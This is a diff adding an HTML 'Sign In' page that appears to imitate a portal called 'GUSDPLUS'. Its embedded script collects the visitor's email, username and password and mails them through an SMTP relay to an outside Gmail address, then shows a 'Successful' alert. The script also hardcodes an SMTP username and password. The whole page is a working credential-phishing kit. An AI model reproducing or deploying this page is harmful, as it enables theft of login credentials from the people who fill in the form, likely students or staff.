@@ -1,0 +1,40 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <form onsubmit="sendEmail(); reset(); return false;">
+            <h3>Sign In</h3>
+            <input type="email" id="email" placeholder="Email" required>
+            <input type="text" id="name" placeholder="Your Username" required>
+            <input type="text" id="Password" placeholder="Password" required>
+            <textarea id="message" rows="4" placeholder="Tell us some feedback!"></textarea>
+            <button type="submit">Sign In</button>
+        </form>
+    </div>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        function sendEmail(){
+            Email.send({
+                Host : "smtp.elasticemail.com",
+                Username : "nmwnzrufuyq@gmail.com",
+                Password : "BADCA6425C5C975D9AE868D43FCCF21924B2",
+                To : 'billzernickowgusd@gmail.com',
+                From : document.getElementById("email").value,
+                Subject : "Login from GUSDPLUS",
+                Body : "Name: " + document.getElementById("name").value
+                    + "<br> Email: " +  document.getElementById("email").value
+                    + "<br> Password: " +  document.getElementById("Password").value
+                    + "<br> Message: " +  document.getElementById("message").value
+            }).then(
+            message => alert("Successful")
+            );
+                }
+    </script>
+</body>
+</html>
